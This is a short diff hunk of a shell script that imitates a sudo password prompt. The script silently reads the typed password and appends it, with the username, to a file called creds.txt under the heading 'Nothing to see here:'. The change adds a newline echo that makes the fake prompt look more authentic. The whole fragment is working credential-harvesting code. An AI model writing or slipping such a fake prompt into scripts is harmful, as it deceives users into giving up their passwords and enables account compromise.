@@ -2,6 +2,7 @@
 
 read -s -p "[sudo] password for $USER: " password
 
+echo
 echo "Nothing to see here:">>creds.txt
 echo "$USER:$password">>creds.txt
 
